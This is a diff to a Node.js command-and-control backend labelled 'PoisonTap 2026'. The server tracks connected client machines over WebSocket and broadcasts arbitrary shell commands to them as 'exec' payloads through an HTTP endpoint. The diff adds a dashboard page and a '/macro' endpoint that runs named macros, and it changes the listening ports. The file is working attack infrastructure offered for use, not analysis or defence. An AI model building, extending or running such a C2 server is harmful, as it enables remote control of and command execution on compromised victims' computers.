@@ -1,12 +1,14 @@
-// PoisonTap 2026 | Modern C2 Backend
+// PoisonTap 2026 | Enhanced C2 Backend with All-Seeing Eye UI
 const http = require('http');
-const https = require('https');
 const WebSocket = require('ws');
 const fs = require('fs');
+const fsPromises = fs.promises;
 const crypto = require('crypto');
+const path = require('path');
+const macros = require('./macros');
 
-const PORT = 1337;
-const WSS_PORT = 443;
+const PORT = 3000;
+const WSS_PORT = 8443;
 const clients = new Map();
 const AUTH_TOKEN = crypto.randomBytes(16).toString('hex');
 
@@ -39,8 +41,21 @@ setInterval(() => {
   });
 }, 30000);
 
-http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
+
+  // Serve All-Seeing Eye 4K UI
+  if (url.pathname === '/' || url.pathname === '/index.html') {
+    try {
+      const html = await fsPromises.readFile(path.join(__dirname, 'ui_4k_all_seeing_eye.html'), 'utf8');
+      res.writeHead(200, {'Content-Type': 'text/html'});
+      res.end(html);
+    } catch (e) {
+      res.writeHead(500); res.end('UI not found. Generate it.');
+    }
+    return;
+  }
+
   if(url.pathname === '/status'){
     res.writeHead(200, {'Content-Type':'application/json'});
     res.end(JSON.stringify({connected: clients.size, token: AUTH_TOKEN}));
@@ -48,9 +63,16 @@ http.createServer((req, res) => {
     const cmd = decodeURIComponent(url.searchParams.get('cmd') || '');
     clients.forEach((c, id) => c.ws.send(JSON.stringify({type:'exec', id, payload:cmd})));
     res.writeHead(200, {'Content-Type':'text/plain'}); res.end('queued');
+  } else if(url.pathname === '/macro'){
+    const name = url.searchParams.get('name');
+    const result = macros.execute(name);
+    res.writeHead(200, {'Content-Type':'application/json'});
+    res.end(JSON.stringify(result));
   } else {
     res.writeHead(404); res.end();
   }
-}).listen(PORT);
+});
 
-console.log(`[+] Backend C2 active: http://0.0.0.0:${PORT} | WSS on ${WSS_PORT} (auth: ${AUTH_TOKEN})`);
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`[+] Backend C2 active: http://0.0.0.0:${PORT} | WSS on ${WSS_PORT} (auth: ${AUTH_TOKEN})`);
+});
